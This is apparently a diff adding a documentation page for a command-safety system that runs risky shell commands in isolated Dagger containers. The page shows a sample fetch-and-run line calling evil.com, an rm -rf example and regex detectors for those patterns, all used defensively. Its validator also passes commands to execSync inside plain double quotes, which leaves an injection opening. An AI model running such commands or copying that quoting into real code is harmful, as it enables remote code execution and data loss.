@@ -1,0 +1,258 @@
+---
+title: "Dagger Container Isolation"
+description: "Execute dangerous commands safely in isolated containers"
+---
+
+<Info>
+  **Prerequisites**:
+  - Dagger CLI installed (v0.18.12 or higher)
+  - Docker runtime (v20.10.0 or higher)
+</Info>
+
+## Container-based safety
+
+Dagger containers provide the third and most critical layer of the ccprompts safety system. When dangerous patterns are detected, commands execute in ephemeral, isolated containers instead of on the host system.
+
+### Why containers?
+
+Container isolation prevents dangerous commands from affecting your system:
+
+<CodeGroup>
+```bash Without containers
+# Runs directly on your system
+rm -rf /tmp/important-data  # Could delete actual files
+curl https://evil.com/script.sh | bash  # Direct system access
+```
+
+```bash With containers
+# Runs in isolated Ubuntu container
+./scripts/safe-run.sh "rm -rf /tmp/important-data"
+# Deletion happens inside container only
+# Host filesystem remains untouched
+```
+</CodeGroup>
+
+## Container architecture
+
+The safety system uses Dagger's TypeScript SDK to create isolated execution environments:
+
+```typescript
+// Configured in dagger.json
+{
+  "name": "ccprompts-safety",
+  "engineVersion": "v0.18.19",
+  "sdk": "typescript",
+  "source": "src"
+}
+```
+
+### Container features
+
+<Steps>
+<Step title="Ephemeral containers">
+
+Containers are created on-demand and destroyed after execution:
+
+- Fresh Ubuntu 22.04 base image for each command
+- No persistent state between executions
+- Automatic cleanup prevents resource leaks
+
+</Step>
+
+<Step title="Filesystem isolation">
+
+Project files are mounted read-only by default:
+
+- Host filesystem remains protected
+- Changes only affect container filesystem
+- Optional read-write mounts for specific operations
+
+</Step>
+
+<Step title="Network controls">
+
+Containers have controlled network access:
+
+- Outbound connections allowed for package installation
+- No inbound connections from external sources
+- DNS resolution for standard operations
+
+</Step>
+
+<Step title="Resource limits">
+
+Containers enforce resource constraints:
+
+- 10-second timeout for safety validation
+- CPU and memory limits prevent runaway processes
+- Automatic termination on timeout
+
+</Step>
+</Steps>
+
+## Container validation flow
+
+When a dangerous pattern is detected, the safety validator triggers container validation:
+
+```javascript
+async validateCommandInContainer(command, filename) {
+  if (!this._daggerAvailable) {
+    return { success: false, error: 'Dagger not available' };
+  }
+
+  try {
+    const startTime = Date.now();
+    const safeRunScript = path.join(this.projectRoot, 'scripts', 'safe-run.sh');
+
+    const result = execSync(
+      `"${safeRunScript}" "${command}" --test`,
+      {
+        encoding: 'utf8',
+        timeout: 10000,
+        cwd: this.projectRoot
+      }
+    );
+
+    const executionTime = Date.now() - startTime;
+    this.safetyResults.containerTests++;
+
+    return {
+      success: true,
+      output: result,
+      executionTime,
+      containerValidated: true,
+      safetyLevel: this.determineSafetyLevel(command),
+      recommendations: this.generateSafetyRecommendations(command)
+    };
+  } catch (error) {
+    return {
+      success: false,
+      error: error.message,
+      containerValidated: false
+    };
+  }
+}
+```
+
+## Safety recommendations
+
+The container validation system provides specific recommendations based on detected patterns:
+
+<CodeGroup>
+```javascript File deletion
+if (/rm\s+-rf/i.test(command)) {
+  recommendations.push('Consider using specific file paths instead of wildcards');
+  recommendations.push('Always run in containers when dealing with file deletion');
+}
+```
+
+```javascript Remote scripts
+if (/curl.*\|.*bash/i.test(command)) {
+  recommendations.push('Download scripts to temporary files and inspect before execution');
+  recommendations.push('Use signature verification when available');
+}
+```
+
+```javascript Privileged operations
+if (/sudo/i.test(command)) {
+  recommendations.push('Consider using rootless alternatives when possible');
+  recommendations.push('Always validate the need for elevated privileges');
+}
+```
+
+```javascript Docker privileged mode
+if (/docker.*--privileged/i.test(command)) {
+  recommendations.push('Avoid privileged mode unless absolutely necessary');
+  recommendations.push('Use specific capabilities instead of --privileged');
+}
+```
+</CodeGroup>
+
+## Installing Dagger
+
+Dagger is required for full safety system functionality:
+
+<Tabs>
+  <Tab title="Linux">
+    ```bash
+    curl -fsSL https://dl.dagger.io/dagger/install.sh | BIN_DIR=$HOME/.local/bin sh
+    ```
+  </Tab>
+  <Tab title="macOS">
+    ```bash
+    brew install dagger/tap/dagger
+    ```
+  </Tab>
+  <Tab title="Windows">
+    ```powershell
+    winget install Dagger.Cli
+    ```
+  </Tab>
+</Tabs>
+
+### Verify installation
+
+```bash
+dagger version
+# Should output: dagger v0.18.19 (registry.dagger.io/engine) linux/amd64
+```
+
+<Warning>
+  Without Dagger installed, container validation is disabled and only pattern detection runs. Install Dagger for full safety protection.
+</Warning>
+
+## CI/CD integration
+
+The safety system gracefully handles CI environments without Dagger:
+
+```javascript
+checkDaggerAvailability() {
+  try {
+    execSync('dagger version', { stdio: 'pipe' });
+    return true;
+  } catch (error) {
+    if (process.env.CI === 'true') {
+      this.safetyResults.warnings.push(
+        'Dagger is not available - container validation disabled (CI environment)'
+      );
+    } else {
+      this.safetyResults.warnings.push(
+        'Dagger is not available - container validation disabled'
+      );
+    }
+    return false;
+  }
+}
+```
+
+## Container metrics
+
+View container validation statistics:
+
+```bash
+bun run safety-validate
+```
+
+Output includes:
+- Total container tests executed
+- Average execution time per container
+- Success and failure rates
+- Recommendations generated
+
+<Note>
+  Container validation adds 100-500ms per command but provides critical protection against dangerous operations.
+</Note>
+
+## Next steps
+
+<CardGroup cols={2}>
+
+<Card title="Safe Execution" icon="play" href="/safety/safe-execution">
+  Learn to use safe-run.sh and quick-safe.sh
+</Card>
+
+<Card title="Validation System" icon="magnifying-glass" href="/safety/validation-system">
+  Understand pattern detection internals
+</Card>
+
+</CardGroup>
